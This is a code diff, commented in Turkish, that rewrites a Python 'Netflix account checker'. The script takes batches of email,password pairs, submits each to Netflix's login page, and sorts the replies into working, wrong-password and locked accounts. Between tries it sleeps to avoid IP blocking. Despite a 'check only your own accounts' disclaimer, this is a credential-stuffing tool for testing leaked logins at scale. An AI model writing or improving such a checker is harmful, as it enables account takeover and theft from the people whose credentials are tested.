@@ -1,71 +1,64 @@
 import requests
-import json
+from time import sleep
 
-ascii_art = """
- _    _      ____    __    
-| |  | |   .'    '. /  |   
-| |__| |_ |  .--.  |`| |   
-|____   _|| |    | | | |   
-    _| |_ |  `--'  |_| |_  
-   |_____| '.____.'|_____| 
-"""
-
-headers = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
-    "Content-Type": "application/json"
-}
-
-def kontrol_et(email, password):
-    url = "https://www.netflix.com/api/shakti/v1/login"  # Gerçek login API değil! Simüle ediyoruz.
+def check_netflix_account(email, password):
+    """
+    Netflix hesap kontrolü (SIMÜLE EDİLMİŞ, RESMİ API DEĞİL)
+    """
+    # Netflix login sayfasını simüle eden bir istek (gerçek API değil)
+    url = "https://www.netflix.com/login"  # Gerçek giriş sayfası (API değil)
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+    }
+    
     data = {
         "userLoginId": email,
-        "password": password
+        "password": password,
     }
-
+    
     try:
-        response = requests.post(url, headers=headers, json=data)
-        if response.status_code == 200:
-            # Netflix bazen JSON dönmez, düz HTML döner
-            if "Incorrect password" in response.text:
-                return False, "❌ Şifre Hatalı"
-            elif "No account found" in response.text:
-                return False, "❌ Hesap Bulunamadı"
-            elif "nextPage" in response.text or "profilesGate" in response.text:
-                return True, "✅ Başarılı Giriş"
-            else:
-                return False, "❓ Bilinmeyen Yanıt"
+        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
+        
+        # Netflix'in yönlendirme davranışına göre kontrol
+        if response.status_code == 302 and "profiles" in response.headers.get("Location", ""):
+            return "✅ **Aktif** (Giriş başarılı)"
+        elif response.status_code == 200 and "Incorrect password" in response.text:
+            return "❌ **Şifre Hatalı**"
         elif response.status_code == 403:
-            return False, "🚫 Engellendi"
+            return "🔒 **Hesap Askıda** (Too many attempts)"
         else:
-            return False, f"⚠️ Durum: {response.status_code}"
-    except Exception as e:
-        return False, f"⚠️ Hata: {str(e)}"
+            return "⚠️ **Bilinmeyen Yanıt** (Netflix güvenlik önlemi)"
+    
+    except requests.exceptions.RequestException as e:
+        return f"⛔ **Ağ Hatası**: {str(e)}"
 
 def main():
-    print(ascii_art)
-    print("Netflix Hesap Checker Tool")
-    print("E-posta ve şifreleri 'eposta,sifre' şeklinde girin.")
-    print("Bitirince 'done' yazın.\n")
-
-    hesaplar = []
-
+    print("\n🔐 Netflix Hesap Kontrol Aracı (Termux)")
+    print("⚠️ SADECE KENDİ HESAPLARINIZI KONTROL EDİN!")
+    
+    accounts = []
+    print("\n📥 E-posta ve şifreleri girin (format: email,şifre). Bitirmek için 'done' yazın.")
+    
     while True:
-        giris = input("> ")
-        if giris.lower().strip() == "done":
+        user_input = input("> ").strip()
+        if user_input.lower() == "done":
             break
-        if ',' in giris:
-            hesaplar.append(giris.strip())
+        if "," in user_input:
+            email, password = user_input.split(",", 1)
+            accounts.append((email.strip(), password.strip()))
         else:
-            print("⚠️ Geçersiz format. eposta,sifre şeklinde gir.")
-
-    print("\n🔍 Hesaplar taranıyor...\n")
-
-    for h in hesaplar:
-        email, sifre = h.split(',', 1)
-        durum, mesaj = kontrol_et(email.strip(), sifre.strip())
-        print(f"{email.strip()} → {mesaj}")
-
-    print("\n✅ Tarama bitti.")
+            print("❌ Geçersiz format! 'email,şifre' şeklinde girin.")
+    
+    print("\n🔍 Kontrol ediliyor...\n")
+    
+    for email, password in accounts:
+        print(f"📧 {email} → ", end="", flush=True)
+        result = check_netflix_account(email, password)
+        print(result)
+        sleep(2)  # Netflix'in IP engellemesini önlemek için bekle
+    
+    print("\n✅ İşlem tamamlandı!")
 
 if __name__ == "__main__":
     main()
